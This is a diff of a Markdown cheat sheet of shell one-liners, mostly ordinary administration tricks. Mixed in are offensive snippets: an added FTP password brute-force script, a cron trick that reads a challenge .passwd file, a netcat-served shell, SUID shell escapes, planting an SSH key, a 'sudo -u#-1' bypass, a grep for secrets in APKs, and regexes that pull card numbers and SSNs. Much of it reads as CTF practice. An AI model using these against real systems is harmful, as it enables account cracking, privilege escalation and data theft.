@@ -46,10 +46,52 @@ If someone has another awesome suggestion how to speed up things, please let me 
 
 65535 ports scanned in ~3.5s 
 
-![portscanner](https://user-images.githubusercontent.com/26827453/174215886-449ca2d0-4141-4ec8-a34d-e15a26ceb256.gif)
+![portscan](https://user-images.githubusercontent.com/26827453/177014274-d1fda5b4-83a5-4a7b-9bfe-17784ffb5ee7.gif)
 
 ```sh
-time seq 65535 | parallel -k --joblog portscan -j9 --pipe --cat -j200% -n9000 --tagstring '\033[30;3{=$_=++$::color%8=}m' 'nc -vz localhost $(head -n1 {})-$(tail -n1 {})'
+time seq 65535 | \
+	parallel \
+        -k --joblog portscan \
+	-j9 \
+	--pipe \
+	--cat \
+	-j200% \
+	-n9000 \
+	--tagstring '\033[30;3{=$_=++$::color%8=}m' \
+	'nc -vz localhost $(head -n1 {})-$(tail -n1 {})'
+```
+
+### Bruteforce two ftp accounts at once
+
+```sh
+#!/bin/bash
+# Author: wuseman
+# Desc: Bruteforce 2 accounts at once
+
+okMSG() {
+    echo -e "[\e[1;32m*\e[0m] $*"
+}
+
+errMSG() {
+    echo -e "[\e[1;31m*\e[0m] $*"
+}
+
+
+1() {
+    curl ftp://host:port -u $line &> /dev/null
+    [[ $? = "0" ]] &&  okMSG "Cracked password for $line" || errMSG "Bad password for $line"
+}
+
+2() {
+    curl ftp://host:port -u $line1 &> /dev/null -u $line1 &> /dev/null
+    [[ $? = "0" ]] &&  okMSG "Cracked password for $line1" || errMSG "Bad password for $line1"
+}
+
+while 
+	read line;read line1; 
+   	do 
+    1;2;sleep 0.1;
+done < test
 ```
 
 ### Download files fast as ****:
@@ -64,6 +106,21 @@ echo "cat /challenge/app-script/ch4/.passwd >/tmp/cracked" > \
     cron.d/go && chmod a+x cron.d/go \
     && sleep 60 && \
     cat /tmp/cracked
+```
+
+### Fix broken SSH permissions for client
+
+```sh
+chmod 700 ~/.ssh
+chmod 644 ~/.ssh/authorized_keys
+chmod 644 ~/.ssh/known_hosts
+chmod 644 ~/.ssh/config
+chmod 600 ~/.ssh/id_rsa
+chmod 644 ~/.ssh/id_rsa.pub
+chmod 600 ~/.ssh/github_rsa
+chmod 644 ~/.ssh/github_rsa.pub
+chmod 600 ~/.ssh/mozilla_rsa
+chmod 644 ~/.ssh/mozilla_rsa.pub
 ```
 
 ### Get user ID
@@ -103,7 +160,7 @@ fuser -k 445/tcp
 bash -i 2>&1 | tee /dev/stderr | nc -l 5000
 ```
 
-### You can use the following trick to easy navigate and select paths or others args $_ takes the last argument of the last simplec command executed
+### You can use the following trick to easy navigate and select paths
 ```sh
 mkdir fooPath && cd $_
 ```
@@ -111,16 +168,23 @@ mkdir fooPath && cd $_
 ###  Fastest segmented parallel sync of a remote directory over ssh
 
 ```sh
-lftp -u user,pwd -e "set sftp:connect-program 'ssh -a -x -T -c arcfour -o Compression=no'; mirror -v -c --loop --use-pget-n=3 -P 2 /remote/dir/ /local/dir/; quit" sftp://remotehost:22
+lftp -u user,pwd -e "set sftp:connect-program 'ssh -a -x -T -c arcfour -o Compression=no'; \
+mirror -v -c --loop --use-pget-n=3 -P 2 /remote/dir/ /local/dir/; quit" sftp://remotehost:22
 ```
 
 ###  Find dupe files and colorize output:
 
 ```sh
-find /glftpd/site/archive -type f|grep '([0-9]\{1,9\})\.[^.]\+$'|parallel -n1 -j200% md5sum ::: |awk 'x[$1]++ { print $2 " :::"}'|sed 's/^/Dupe: /g'|sed 's,Dupe,\x1B[31m&\x1B[0m,'
+find /glftpd/site/archive -type f | \
+	egrep '([0-9]\{1,9\})\.[^.]\+$'|parallel -n1 -j200% md5sum ::: | \
+	awk 'x[$1]++ { print $2 " :::"}' |  \
+	sed 's/^/Dupe: /g' | \
+	sed 's,Dupe,\x1B[31m&\x1B[0m,'
 ```
 
 ###  Create a progress bar over entire window until we count to 1000
+
+![Screenshot](.previews/parallel_print_progress.gif)
 
 ```sh
 seq 1000 |parallel -j30 --bar '(echo {};sleep 0.1)'
@@ -132,6 +196,15 @@ seq 1000 |parallel -j30 --bar '(echo {};sleep 0.1)'
 lsof -i -nlP|awk '{print $9, $8, $1}'|sed 's/.*://'|sort -u
 ```
 
+### For add those ports to iptable: 
+
+![Screenshot_20220702_213112](https://user-images.githubusercontent.com/26827453/177014062-ff15b9e5-5d59-49fb-b387-d89eb022bc34.png)
+
+```sh
+lsof -i -nlP|awk '{print $9}'|sed 's/.*://'|sort -u|column -t | \
+	sed 's/^/iptables -A INPUT -p TCP --dport /g'\
+	|sed 's/$/ -m state --state NEW -j ACCEPT/g
+```
 ### Print all ips that we have a conection with atm
 
 ```sh
@@ -142,8 +215,8 @@ netstat -lantp | grep ESTABLISHED |awk '{print $5}' | awk -F: '{print $1}' | sor
 ```sh
 int main(void)
 {
-    system("ls /path/to/.passwd");
-    return 0;
+        system("ls /path/to/.passwd");
+        return 0;
 }
 ```
 
@@ -161,6 +234,24 @@ echo $PATH
 
 ```sh
 echo -e "URL Title: $(curl -s $1|grep -i title|cut -d'<' -f2|cut -d'>' -f2)"
+```
+
+
+### Create a UEFI bootable usb:
+
+```sh
+parted /dev/sdc -s print
+mkfs.vfat -F 32 /dev/<device>1
+mount /dev/<device>1 /<dev_mountpoint>
+mount /path/to/iso/Win10_1511_1_<Version>_<Language>_x64.iso /<iso_mountpoint>
+cp -R /<iso_mountpoint>/* /<dev_mountpoint>/
+printf '%s' "Done" 
+```
+### Setup efiboomgr
+
+You should know how to edit this line otherwise, man efibootmgr
+```sh
+efibootmgr -d /dev/sda -p 2 -c -L "Gentoo Linux" -l /vmlinuz-5.4.97-gentoo-x86_64 -u "cryptdevice=UUID=80bf5e3b-c34f-4917-b7e8-6733909ef5a8:latitude-rootfs root=UUID=80bf5e3b-c34f-4917-b7e8-6733909ef5a8 rw initrd=/initramfs-5.4.97-gentoo-x86_64.img"
 ```
 
 ### Run 10 curl commands in parallel via xargs
@@ -204,10 +295,13 @@ done
 
 ### Print Sensor Data Without Any Extra Tools
 
+![123](https://user-images.githubusercontent.com/26827453/177014142-22a4fbc3-520a-4965-bef8-3281b142f1e8.png)
+
 ```sh
-paste <(cat /sys/class/thermal/thermal_zone*/type) <(cat /sys/class/thermal/thermal_zone*/temp) \
-| column -s $'\t' -t \
-| sed 's/\(.\)..$/.\1°C/'
+paste <(cat /sys/class/thermal/thermal_zone*/type) \
+      <(cat /sys/class/thermal/thermal_zone*/temp) \
+	|column -s $'\t' -t \
+	|sed 's/\(.\)..$/.\1°C/'
 ```
 
 ### Print Sensor Data in a for-loop
@@ -227,13 +321,17 @@ flashing_text () {
   wuzi='*w*u*s*e*m*a*n*_*p*w*n*z \e[00;34m !';
   for i in {0..59}; do
       echo -ne "\r${wuzi:0:$i}" ;sleep 0.05;
-  done };flashing_text;
+done 
+};
+
+flashing_text;
 ```
 
 ### Print core speeds and also the real speed
 
 ```sh
-awk -F": " '/cpu MHz\ */ { print "Processor (or core) running speed is: " $2 }' /proc/cpuinfo ; dmidecode | awk -F": " '/Current Speed/ { print "Processor real speed is: " $2 }'
+awk -F": " '/cpu MHz\ */ { print "Processor (or core) running speed is: " $2 }' /proc/cpuinfo ; 
+dmidecode | awk -F": " '/Current Speed/ { print "Processor real speed is: " $2 }'
 ```
 
 ### Some distro checker commands I used during the years in my scripts
@@ -313,7 +411,9 @@ fi
 
 ### How I grab valuable stuff from apk files (extracted)
 ```sh
-grep -EHirn "accesskey|admin|aes|api_key|apikey|checkClientTrusted|crypt|http:|https:|password|pinning|secret|SHA256|SharedPreferences|superuser|token|X509TrustManager|insert into" APKfolder/
+grep -EHirn "accesskey|admin|aes|api_key|apikey|checkClientTrusted|crypt|http:|https:|password\
+|pinning|secret|SHA256|SharedPreferences|superuser|token|X509TrustManager \
+|insert into" APKfolder/
 ```
 
 ### Get Sensor Data Without Any Info 
@@ -343,23 +443,29 @@ done
 ### Do It Once
 
 ```sh
-seq 1 | parallel -n0 "curl -H 'Content-Type: application/json' https://ifconfig.co -X POST -d '{\"url\":\"https://google.com/\"}'"
+seq 1 | parallel -n0 "curl -H 'Content-Type: application/json' \
+	https://ifconfig.co -X POST \
+	-d '{\"url\":\"https://google.com/\"}'"
 ```
 ### Do It Twice
 
 ```sh
-seq 2 | parallel -n0 "curl -H 'Content-Type: application/json' https://ifconfig.co -X POST -d '{\"url\":\"https://google.com/\"}'"
+seq 2 | parallel -n0 "curl -H 'Content-Type: application/json' \
+	https://ifconfig.co -X POST \
+	-d '{\"url\":\"https://google.com/\"}'"
 ```
 
 ### Do It 4 Times, But At 2 A Aime
 
 ```sh
-seq 4 | parallel -n0 -j2 "curl -H 'Content-Type: application/json' https://ifconfig.co -X POST -d '{\"url\":\"https://google.com/\"}'"
+seq 4 | parallel -n0 -j2 "curl -H 'Content-Type: application/json' \
+	https://ifconfig.co -X POST -d '{\"url\":\"https://google.com/\"}'"
 ```
 ### More parallel tricks for curl
 
 ```sh
-seq 1 | parallel -n0 curl "http --ignore-stdin POST https://ifconfig.co url=https://google.com/"
+seq 1 | parallel -n0 curl \
+	"http --ignore-stdin POST https://ifconfig.co url=https://google.com/"
 ```
 ### Continue until forever until we press ctrl+c (100x)
 
@@ -372,44 +478,6 @@ while true; do
 done
     wait 
 done
-```
-
-### Generate a random user_agent as User-Agent when mirroring / bruteforcing / spidering
-
-```sh
-shuf -e "$(curl -s https://raw.githubusercontent.com/wuseman/www.nr1.nu/main/docs/src/markdown/misc/user_agents.md | \
-    sed -n '22,$p' | \
-    shuf -n 1)"
-```
-
-### Check were a shorturl is taking us
-
-```sh
-curl -Ls -o /dev/null -w %{url_effective} ${1}
-```
-
-### Scan our network and print result in nice columns
-
-```sh 
-nmap -sn 192.168.1.0/24 -oG | awk '$4=="Status:" && $5=="Up" {print $0}'|column -t
-```
-
-### Ports we probably wanna set as accpepted in our iptable chains
-
-```sh
-lsof -i -nlP|awk '{print $9, $8, $1}'|sed 's/.*://'|sort -u|column  -t
-```
-
-### Print all ips that we have a conection with atm
-
-```sh
-netstat -lantp | grep ESTABLISHED |awk '{print $5}' | awk -F: '{print $1}' | sort -u
-```
-
-### Print title of website:
-
-```sh
-echo -e "URL Title: $(curl -s $1|grep -i title|cut -d'<' -f2|cut -d'>' -f2)"
 ```
 
 ### Check if a zip or a rar file has password-protection
@@ -549,7 +617,7 @@ exec "/bin/sh";
 perl —e 'exec "/bin/sh";'
 ```
 
-## Dash
+#### Dash
 
 ```sh
 # /bin/dash is the only shell to keep the sticky bit, so if you run as root (included cron, or services running as root): 
@@ -577,7 +645,6 @@ sudo /etc/init.d/ssh restart
 echo 'ssh-rsa AAAA[...snip...]fd48as= root@kali-jms' > authorized_keys
 sudo -u#-1 bash
 ```
-
 
 ### Regex
 
@@ -620,7 +687,6 @@ grep -E -o "3[47][0-9]{2}[ -]?[0-9]{6}[ -]?[0-9]{5}" *.txt > amex.txt
 
 ### Extract IDs
 
-
 #### Extract Social Security Number (SSN)
 ```sh
 grep -E -o "[0-9]{3}[ -]?[0-9]{2}[ -]?[0-9]{4}" 
@@ -648,5 +714,7 @@ grep -Po 'd{3}[s-_]?d{3}[s-_]?d{4}'
 
 #### Extract ISBN Numbers
 ```sh
-grep -a -o "\bISBN(?:-1[03])?:? (?=[0-9X]{10}$|(?=(?:[0-9]+[- ]){3})[- 0-9X]{13}$|97[89][0-9]{10}$|(?=(?:[0-9]+[- ]){4})[- 0-9]{17}$)(?:97[89][- ]?)?[0-9]{1,5}[- ]?[0-9]+[- ]?[0-9]+[- ]?[0-9X]\b" 
+grep -a -o "\bISBN(?:-1[03])?:? (?=[0-9X]{10}$|(?=(?:[0-9]+\
+	[- ]){3})[- 0-9X]{13}$|97[89][0-9]{10}$|(?=(?:[0-9]+[- ])\
+	{4})[- 0-9]{17}$)(?:97[89][- ]?)?[0-9]{1,5}[- ]?[0-9]+[- ]?[0-9]+[- ]?[0-9X]\b" 
 ```
